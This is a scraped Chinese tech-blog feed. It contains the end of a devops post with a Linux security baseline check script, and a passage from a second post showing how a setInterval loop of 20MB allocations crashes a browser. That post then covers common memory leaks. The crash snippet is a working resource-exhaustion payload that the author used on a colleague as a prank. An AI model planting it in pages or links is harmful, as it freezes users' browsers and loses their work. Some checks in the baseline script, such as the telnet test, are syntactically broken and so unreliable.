  greenecho <span class="hljs-string">"僵尸进程数：<span class="hljs-variable">$proc_zombie</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
}

<span class="hljs-function"><span class="hljs-title">main</span></span>() {
  base_info
  load_info
  mem_info
  swap_info 
  disk_info
  proc_info
}

main

</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0774529f73246b4bb8274b18f5b562a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873020&amp;x-signature=jV1VaAqkaznrbcNqiNREM2FoY%2Bc%3D" alt="image-20230426114043734" loading="lazy"/></p>
<h4 data-id="heading-69">2.安全基线检查脚本</h4>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim   project_linux_base_line_check.sh </span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:project_linux_base_line_check.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:安全基线检查脚本</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#1.加载函数</span>
. /server/scripts/devops-shell/func.sh
<span class="hljs-function"><span class="hljs-title">printline</span></span>() {
   blueecho <span class="hljs-string">"------------<span class="hljs-variable">$1</span>--------------"</span>
}

<span class="hljs-comment"># -ne不等于0</span>
<span class="hljs-function"><span class="hljs-title">check_root</span></span>() {
  [ <span class="hljs-variable">$UID</span> -ne 0 ] &amp;&amp; {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"只能root用户使用该脚本"</span>
    <span class="hljs-built_in">exit</span> 1
  }
}
<span class="hljs-function"><span class="hljs-title">check_cmd</span></span>() {
  <span class="hljs-built_in">which</span> wget nc ntpdate &amp;&gt;/dev/null
  [ $? -ne 0 ] &amp;&amp; {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"没有安装常用工具"</span>
    <span class="hljs-built_in">exit</span> 2
  }
}
<span class="hljs-comment">#2.函数</span>
<span class="hljs-comment">#####身份鉴权#####</span>
<span class="hljs-function"><span class="hljs-title">user_password_complex</span></span>() {
  printline 1.检查密码复杂度
  pass_complex=`egrep -o <span class="hljs-string">'minlen|[uld]credit'</span> /etc/pam.d/system-auth |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$pass_complex</span> -eq 4 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"密码复杂度配置OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"未配置密码复杂度failed"</span>
    rc=1  
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-function"><span class="hljs-title">user_password_lock</span></span>() {
  printline 2.检查密码认证失败锁定的配置
  pass_lock=`grep pam_tally2.so /etc/pam.d/system-auth |egrep -o <span class="hljs-string">'deny=|unlock_time='</span> |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$pass_lock</span> -eq 2 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"密码认证失败锁定配置OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"密码认证失败锁定配置failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>

}

<span class="hljs-function"><span class="hljs-title">user_password_expire</span></span>() {
  printline 3.检查口令生存期配置
  pass_max_days=`awk <span class="hljs-string">'/^PASS_MAX_DAYS/{print $2}'</span> /etc/login.defs`
  pass_warn_age=`awk <span class="hljs-string">'/^PASS_WARN_AGE/{print $2}'</span> /etc/login.defs`
  max_days=90
  warn_age=7
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$pass_max_days</span> -le <span class="hljs-variable">$max_days</span> -a <span class="hljs-variable">$pass_warn_age</span> -ge <span class="hljs-variable">$warn_age</span> ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"口令生存周期配置OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"口令生存周期未配置failed"</span>
    rc=1  
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span> 
}

<span class="hljs-function"><span class="hljs-title">check_user_password_expire</span></span>() {
  expire_days=30
  printline 4.检查是否有口令最近<span class="hljs-variable">${expire_days}</span>天将要过期的用户
  login_user=`awk -F: <span class="hljs-string">'$NF=="/bin/bash" {print $1}'</span> /etc/passwd`
  <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> <span class="hljs-variable">$login_user</span>
  <span class="hljs-keyword">do</span>
    expire_status=`chage -l <span class="hljs-variable">$name</span> |awk -F:  <span class="hljs-string">'NR==2{print $2}'</span>`
    [ <span class="hljs-string">"<span class="hljs-variable">$expire_status</span>"</span> = <span class="hljs-string">" never"</span> ] &amp;&amp; <span class="hljs-built_in">continue</span>
    time_expire_second=`<span class="hljs-built_in">date</span> -d <span class="hljs-string">"<span class="hljs-variable">$expire_status</span>"</span> +%s`
    time_now_second=`<span class="hljs-built_in">date</span> +%s`
    time_leave_days=`<span class="hljs-built_in">echo</span> <span class="hljs-string">"(<span class="hljs-variable">${time_expire_second}</span>-<span class="hljs-variable">${time_now_second}</span>)/86400"</span> |bc`
    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$time_leave_days</span> -le <span class="hljs-variable">$expire_days</span> ];<span class="hljs-keyword">then</span>
      redecho <span class="hljs-string">"用户<span class="hljs-variable">${name}</span>即将过期，你还有<span class="hljs-variable">${time_leave_days}</span>天"</span>
    <span class="hljs-keyword">fi</span>
  <span class="hljs-keyword">done</span>
}

<span class="hljs-function"><span class="hljs-title">user_remote_access</span></span>() {
  printline 5.检查是否开启未加密传输服务
  <span class="hljs-keyword">if</span> [ nc -z localhost 23 &amp;&gt;/dev/null ];<span class="hljs-keyword">then</span>
    redecho <span class="hljs-string">"开启了未加密的telnet服务"</span>
    rc=1
  <span class="hljs-keyword">else</span>
    greenecho <span class="hljs-string">"telnet服务已关闭"</span>
    rc=0
  <span class="hljs-keyword">fi</span>
}

<span class="hljs-function"><span class="hljs-title">user_password_history</span></span>() {
  printline 6.检查是否配置历史口令重复要求
  pass_history=`grep pam_pwhistory.so /etc/pam.d/system-auth |grep -o remember |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$pass_history</span> -eq 1 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"历史口令重复策略配置OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"未配置历史口令策略failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-comment">########访问控制########</span>
<span class="hljs-function"><span class="hljs-title">deny_useless_user</span></span>() {
  printline 7.检查是否禁用无用用户
  useless_user_cnt=`grep -v <span class="hljs-string">'^#'</span> /etc/passwd |egrep <span class="hljs-string">'lp|nuucp|hpdb|sync|adm|ftp|games'</span> |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$useless_user_cnt</span> -eq 0 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"禁用了无用用户OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"未禁用无用用户failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-function"><span class="hljs-title">fake_root_user</span></span>() {
  printline 8.检查是否存在uid为0，用户名不是root的用户
  fake_root=`awk -F: <span class="hljs-string">'$3==0 &amp;&amp; $1!="root" {print $1}'</span> /etc/passwd |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$fake_root</span> -eq 0 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"不存在这样的用户OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"存在这样的用户failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-function"><span class="hljs-title">check_uid_gid_file</span></span>() {
  printline 9.检查是否存在额外的uid，gid文件
  uid_gid_file=`find <span class="hljs-variable">${PATH//:/ }</span> /tmp/ -perm /+s 2&gt;/dev/null|<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$uid_gid_file</span> -eq 23 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"uid,gid文件OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"uid,gid文件failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>

}

<span class="hljs-function"><span class="hljs-title">check_everybody_write_dir</span></span>() {
  printline 10.检查是否有过大权限的目录
  dir_777=`find / -<span class="hljs-built_in">type</span> d -perm /o+w |egrep -v <span class="hljs-string">'/tmp|/dev'</span> |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$dir_777</span> -eq 0 ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"系统没有过大权限的目录OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"系统有大过大权限的目录failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>

}

<span class="hljs-function"><span class="hljs-title">check_hidden</span></span>() {
  printline 11.检查是否有隐藏文件或目录
  dir_list=`awk <span class="hljs-string">'$3~/xfs|ext[2-4]/{print $2}'</span> /etc/fstab `
  <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$dir_list</span>
  <span class="hljs-keyword">do</span>
    hidden_cnt=`find <span class="hljs-variable">$dir</span> -xdev -name <span class="hljs-string">".*"</span> |egrep -v <span class="hljs-string">"/sys/|/proc/"</span> |<span class="hljs-built_in">wc</span> -l`
    greenecho <span class="hljs-string">"<span class="hljs-variable">$dir</span> 磁盘分区  隐藏文件的数量：<span class="hljs-variable">$hidden_cnt</span>"</span>
  <span class="hljs-keyword">done</span>
}

<span class="hljs-comment">#####安全审计#####</span>
<span class="hljs-function"><span class="hljs-title">check_ntp</span></span>() {
  printline 12.检查是否配置了时间同步
  ntp_sync=`crontab -l|grep ntpdate |<span class="hljs-built_in">wc</span> -l`
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$ntp_sync</span> -eq 1 ];<span class="hljs-keyword">then</span> 
     greenecho <span class="hljs-string">"配置了时间同步OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"没有配置时间同步failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-comment">#####入侵防护#####</span>
<span class="hljs-function"><span class="hljs-title">check_env</span></span>() {
  printline 13.检查是否配置了安全的环境变量
  
  <span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$TMOUT</span>"</span>x != <span class="hljs-string">""</span>x -a <span class="hljs-variable">$HISTSIZE</span> -le 10 ];<span class="hljs-keyword">then</span>
     greenecho <span class="hljs-string">"配置了安全的环境变量OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"没有配置安全的环境变量failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>

}

<span class="hljs-function"><span class="hljs-title">check_root_remote_login</span></span>() {
  printline 14.检查root是否可以远程登录
  root_remote_login=`awk <span class="hljs-string">'/^PermitRootLogin/{print $2}'</span> /etc/ssh/sshd_config`
  <span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$root_remote_login</span>"</span>x = <span class="hljs-string">"no"</span>x ];<span class="hljs-keyword">then</span>
    greenecho <span class="hljs-string">"root禁用了远程登录功能OK"</span>
    rc=0
  <span class="hljs-keyword">else</span>
    redecho <span class="hljs-string">"root开启了远程登录功能failed"</span>
    rc=1
  <span class="hljs-keyword">fi</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>

}
<span class="hljs-comment">#####身份鉴权#####</span>
<span class="hljs-function"><span class="hljs-title">user</span></span>() {
  user_password_complex
  user_password_lock
  user_password_expire
  check_user_password_expire
  user_remote_access
  user_password_history
}

<span class="hljs-comment">#####访问控制#####</span>
<span class="hljs-function"><span class="hljs-title">access</span></span>() {
  deny_useless_user
  fake_root_user
  check_uid_gid_file
  check_everybody_write_dir
  check_hidden
}

<span class="hljs-comment">#####安全审计#####</span>
<span class="hljs-function"><span class="hljs-title">audit</span></span>() {
 check_ntp 
}

<span class="hljs-comment">#####入侵防护#####</span>
<span class="hljs-function"><span class="hljs-title">ruqin</span></span>() {
  check_env
  check_root_remote_login
}

<span class="hljs-function"><span class="hljs-title">main</span></span>() {
  check_root
  check_cmd
  user
  access
  audit
  ruqin
}

main

</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dea24aeceae04a1a9bbb282338990802~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873020&amp;x-signature=z02rWdVbDxrmmMa0%2FnX9Fq6BCU8%3D" alt="image-20230426102818867" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[我是如何用一行 JS 代码，让你的浏览器内存瞬间崩溃的？]]></title>    <link>https://juejin.cn/post/7594396523439964195</link>    <guid>https://juejin.cn/post/7594396523439964195</guid>    <pubDate>2026-01-13T04:11:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594396523439964195" data-draft-id="7594303923362873384" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="我是如何用一行 JS 代码，让你的浏览器内存瞬间崩溃的？"/> <meta itemprop="keywords" content="前端,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-13T04:11:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            我是如何用一行 JS 代码，让你的浏览器内存瞬间崩溃的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T04:11:47.000Z" title="Tue Jan 13 2026 04:11:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c3a3aa71a5740e6b4db46e14137b3a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=6qAFbero3ZHZC1HP9Pe0c2S59WE%3D" alt="image_w3wbkq.webp" loading="lazy"/></p>
<p>下午茶时间，我给隔壁的后端老哥发了个链接。</p>
<p>他毫无防备地点开了。</p>
<p>三秒钟后，我听到他那台 16G 内存的 MacBook Pro 风扇开始狂啸，仿佛要起飞🤣。</p>
<p>五秒钟后，他的鼠标指针变成了彩虹圈，卡在屏幕中间动弹不得。</p>
<p>十秒钟后，Chrome 惨叫一声，弹出了那个让无数前端人闻风丧胆的页面——(崩溃啦)。</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4404d173be954a93b08999d7058cfca7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=cwyjjK99etomM8rcBj0KZqR9n7g%3D" alt="57f8a59240236884e204a1cc951a851bc8ec20f4.png" loading="lazy"/></p>
<p>后端老哥过来问我：你刚才发的是什么病毒？！😡</p>
<p>我淡定地喝了一口咖啡：没有病毒，只是一行 JavaScript 代码而已。</p>
<p>今天，我就带大家拆解一下这个崩溃背后的原理。这不仅是个恶作剧，更是深入理解 <strong>V8 引擎内存机制</strong> 的绝佳机会。</p>
<hr/>
<h3 data-id="heading-0">这行代码长什么样呢？</h3>
<p>⚠️ 高能预警：请勿在未保存工作的浏览器标签页中运行以下代码！</p>
<p>⚠️ 高能预警：请勿在未保存工作的浏览器标签页中运行以下代码！</p>
<p>⚠️ 高能预警：请勿在未保存工作的浏览器标签页中运行以下代码！</p>
<p>重要的事，先说三遍😃</p>
<p>如果你想让浏览器瞬间暴毙，其实不需要什么复杂的黑客技术。最简单粗暴的方式，就是 <strong>堆溢出 (Heap Overflow)</strong>。</p>
<p>核心代码只有这一行（为了方便展示，我稍微展开一点）：</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// 就是它！</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">boom</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">leakArr</span> = [];
  <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 分配 20MB 的 TypedArray</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">leakArr</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">20</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>));
  }, <span class="hljs-number">10</span>);
};

<span class="hljs-title function_">boom</span>();
</code></pre>
<p><strong>原理极其简单：</strong></p>
<ol>
<li>我们开了一个 <code>setInterval</code> 定时器，每 10 毫秒执行一次。</li>
<li><code>new Uint8Array(20 * 1024 * 1024)</code> 会创建一个约 20MB 的 TypedArray。</li>
<li>最关键的一步：我们将这个TypedArray <code>push</code> 进了一个<strong>全局变量</strong> <code>window.leakArr</code> 中。</li>
</ol>
<p>因为 leakArr 是挂在 window 上的，浏览器会认为：这个数据用户还要用，我不能回收！</p>
<p>于是，GC（垃圾回收器）不敢动它。</p>
<p>内存就像被注水一样瞬间飙升。</p>
<p>1秒钟增加 1GB，几秒钟后，Chrome 的 V8 引擎就会因为达到 Heap Limit（堆上限） 而崩溃。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5b32a37ab634edebf43646a0139db44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=J1Ba3ESHOpsEF8HXhC9pDPEFO0w%3D" alt="screenshot-20260113-114331.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">浏览器是怎么死的？</h3>
<p>很多兄弟会问：我电脑 32G 内存，这才哪到哪？为什么浏览器这么脆？</p>
<p>这里就要讲到 Node.js 和 Chrome V8 的一个限制。</p>
<h4 data-id="heading-2">V8 的内存限制（Heap Limit）</h4>
<p>Chrome 并不是你有多少物理内存，它就敢用多少。</p>
<p>为了防止网页占用过多资源导致系统卡死，V8 对每个页面的 JS 堆内存是有硬性限制的。</p>
<ul>
<li>在 64 位系统下，默认限制通常在 <strong>1.4GB - 4GB</strong> 之间（取决于 Chrome 版本和设备）。</li>
</ul>
<p>当你那行代码疯狂申请内存时，V8 的处理是这样的：</p>
<ul>
<li><strong>第 1 秒</strong>：内存占用 500MB。GC：还行，能撑住。</li>
<li><strong>第 2 秒</strong>：内存占用 1.5GB。GC：卧槽？快满了！赶紧 Full GC（全量回收）一下！</li>
<li><strong>第 2.1 秒</strong>：GC 发现 <code>leakArr</code> 被 <code>window</code> 引用着，<strong>一个字节都回收不掉</strong>。</li>
<li><strong>第 3 秒</strong>：内存突破限制。V8：毁灭吧，累了😖。 -&gt; <strong>Crash。</strong></li>
</ul>
<h4 data-id="heading-3">主线程阻塞 (The UI Freeze)</h4>
<p>在崩溃前，为什么鼠标会卡死？</p>
<p>因为 JS 是单线程的。</p>
<p>当内存快满时，GC 会疯狂介入，试图腾出空间。GC 的执行是会阻塞主线程的。</p>
<p>CPU 都在忙着做垃圾回收，根本没空去响应你的鼠标移动和页面渲染。</p>
<hr/>
<h3 data-id="heading-4">你可能每天都在写 Bug🤔</h3>
<p>上面的代码是明目张胆的抢劫，但在我们的日常业务代码中，更多的是 <strong>慢性偷窃</strong>——也就是<strong>内存泄漏 (Memory Leak)</strong>。</p>
<p>虽然你不会写出 <code>while(true)</code>，但以下这几种操作，和上面的性质是一样的：</p>
<h4 data-id="heading-5">忘记清除的定时器 / 监听器</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// React 组件 useEffect</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Fetching data...'</span>);
    <span class="hljs-comment">// 闭包引用了大量数据</span>
  }, <span class="hljs-number">1000</span>);

  <span class="hljs-comment">// 致命错误：忘记写 return () =&gt; clearInterval(timer);</span>
}, []);
</code></pre>
<p>如果你在 SPA（单页应用）里频繁切换路由，这个组件虽然卸载了，但 <code>timer</code> 还在跑，引用的数据还在内存里。切几十次路由，页面就卡成 PPT 了。</p>
<h4 data-id="heading-6">游离的 DOM 节点</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">let</span> detachedNodes = [];
<span class="hljs-keyword">function</span> <span class="hljs-title function_">create</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> ul = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'ul'</span>);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    ul.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'li'</span>));
  }
  <span class="hljs-comment">// 虽然这个 ul 没有插入到 document.body 里</span>
  <span class="hljs-comment">// 但它被全局变量 detachedNodes 引用着，无法回收！</span>
  detachedNodes.<span class="hljs-title function_">push</span>(ul); 
}
</code></pre>
<p>很多图表库（ECharts 等）如果销毁时不调用 <code>dispose()</code>，就会留下这种内存幽灵。</p>
<h4 data-id="heading-7">3. 闭包陷阱</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"/>) {
